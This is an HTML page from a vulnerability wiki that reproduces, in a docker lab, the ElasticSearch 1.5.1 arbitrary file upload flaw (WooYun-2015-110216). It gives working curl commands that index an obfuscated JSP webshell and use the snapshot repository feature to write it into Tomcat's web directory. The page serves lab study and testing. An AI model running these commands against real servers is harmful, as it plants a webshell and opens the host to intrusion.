<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Elasticsearch/WooYun-2015-110216/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>ElasticSearch Arbitrary File Upload (WooYun-2015-110216) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "ElasticSearch Arbitrary File Upload (WooYun-2015-110216)", url: "#_top", children: [
              {title: "Environment Setup", url: "#environment-setup" },
              {title: "Vulnerability Reproduction", url: "#vulnerability-reproduction" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        ElasticSearch 任意文件上传漏洞（WooYun-2015-110216）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../CVE-2015-5531/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../CVE-2015-5531/README.zh-cn/" class="btn btn-xs btn-link">
        ElasticSearch 快照和恢复功能目录穿越漏洞（CVE-2015-5531）
      </a>
    </div>
    
  </div>

    

    <h1 id="elasticsearch-arbitrary-file-upload-wooyun-2015-110216">ElasticSearch Arbitrary File Upload (WooYun-2015-110216)<a class="headerlink" href="#elasticsearch-arbitrary-file-upload-wooyun-2015-110216" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>ElasticSearch is a distributed, RESTful search and analytics engine.</p>
<p>A vulnerability in ElasticSearch's backup functionality allows attackers to write arbitrary files to the filesystem, potentially leading to webshell upload when combined with other web services.</p>
<p>ElasticSearch includes a data backup feature that allows users to specify a path where backup data will be stored. Both the path and file names are controllable by the user.</p>
<p>If other web services (like Tomcat, PHP, etc.) are running on the same system, an attacker can exploit ElasticSearch's backup functionality to write a webshell to a web-accessible directory.</p>
<p>Similar to <a href="../CVE-2015-5531/">CVE-2015-5531</a>, this vulnerability is related to the backup repository functionality. In ElasticSearch versions after 1.5.1, the root path of backup repositories is restricted to the <code>path.repo</code> configuration option. If administrators don't configure this option, the backup functionality is disabled by default. Even if configured, writing a webshell is only possible if the web root is within the configured directory.</p>
<p>References:</p>
<ul>
<li><a href="http://cb.drops.wiki/bugs/wooyun-2015-0110216.html">http://cb.drops.wiki/bugs/wooyun-2015-0110216.html</a></li>
</ul>
<h2 id="environment-setup">Environment Setup<a class="headerlink" href="#environment-setup" title="Permanent link">&para;</a></h2>
<p>Execute the following commands to start a ElasticSearch server 1.5.1, and a Tomcat server is running on the same container:</p>
<div class="highlight"><pre><span></span><code>docker compose up -d
</code></pre></div>
<p>After the environment starts, you can access the ElasticSearch server at <code>http://your-ip:9200</code>, and the Tomcat server at <code>http://your-ip:8080</code>.</p>
<p>Tomcat is installed in <code>/usr/local/tomcat</code> with its web directory at <code>/usr/local/tomcat/webapps</code>. ElasticSearch is installed in <code>/usr/share/elasticsearch</code>.</p>
<h2 id="vulnerability-reproduction">Vulnerability Reproduction<a class="headerlink" href="#vulnerability-reproduction" title="Permanent link">&para;</a></h2>
<p>Our goal is to use ElasticSearch to write a webshell into <code>/usr/local/tomcat/webapps</code>.</p>
<p>First, create a malicious index document:</p>
<div class="highlight"><pre><span></span><code>curl -XPOST http://127.0.0.1:9200/yz.jsp/yz.jsp/1 -d&#39;
{&quot;&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%&gt;&quot;:&quot;test&quot;}
&#39;
</code></pre></div>
<p>Then create a malicious repository. The <code>location</code> value is the path where we want to write our file.</p>
<blockquote>
<p>Note: The Repositories path is interesting because it can write to any accessible location, and if the path doesn't exist, it will be created automatically. This means you can create arbitrary directories using the file access protocol. Here we point the path to Tomcat's web deployment directory because Tomcat will automatically create a new application when a folder is created in this directory (if the filename is wwwroot, the created application name will be wwwroot).</p>
</blockquote>
<div class="highlight"><pre><span></span><code>curl -XPUT &#39;http://127.0.0.1:9200/_snapshot/yz.jsp&#39; -d &#39;{
     &quot;type&quot;: &quot;fs&quot;,
     &quot;settings&quot;: {
          &quot;location&quot;: &quot;/usr/local/tomcat/webapps/wwwroot/&quot;,
          &quot;compress&quot;: false
     }
}&#39;
</code></pre></div>
<p>Verify and create the repository:</p>
<div class="highlight"><pre><span></span><code>curl -XPUT &quot;http://127.0.0.1:9200/_snapshot/yz.jsp/yz.jsp&quot; -d &#39;{
     &quot;indices&quot;: &quot;yz.jsp&quot;,
     &quot;ignore_unavailable&quot;: &quot;true&quot;,
     &quot;include_global_state&quot;: false
}&#39;
</code></pre></div>
<p>Done!</p>
<p>Access <code>http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp</code> to find our uploaded webshell.</p>
<p>This shell allows writing arbitrary strings to test.jsp in the wwwroot directory. For example: <code>http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success</code>. Then accessing /wwwroot/test.jsp will show "success":</p>
<p><img alt="" src="1.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        ElasticSearch 任意文件上传漏洞（WooYun-2015-110216）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../CVE-2015-5531/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../CVE-2015-5531/README.zh-cn/" class="btn btn-xs btn-link">
        ElasticSearch 快照和恢复功能目录穿越漏洞（CVE-2015-5531）
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>